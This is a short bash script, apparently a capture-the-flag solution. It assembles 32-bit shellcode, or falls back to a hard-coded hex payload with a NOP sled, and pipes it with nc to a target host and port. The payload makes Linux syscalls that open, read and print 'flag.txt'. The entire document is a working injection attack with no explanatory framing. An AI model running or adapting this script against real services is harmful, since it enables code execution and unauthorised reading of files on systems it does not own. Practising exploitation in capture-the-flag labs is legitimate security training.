#!/bin/bash

HOST=$1
PORT=$2

gcc shellcode0.s -m32 -c -o shellcode.bin

if [ $? -eq 0 ];then
  objcopy -O binary shellcode.bin out.bin
  cat out.bin | nc "$HOST" "$PORT"
else
  python2 -c 'print
  "\x90\x90\x90\x90\x90\x90\xb8\x05\x00\x00\x00\x6a\x00\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x54\x5b\xb9\x00\x00\x00\x00\xcd\x80\x83\xec\x40\x89\xc3\x89\xe1\xba\x40\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\x90\x90\x90\x90"' | nc "$HOST" "$PORT"
fi
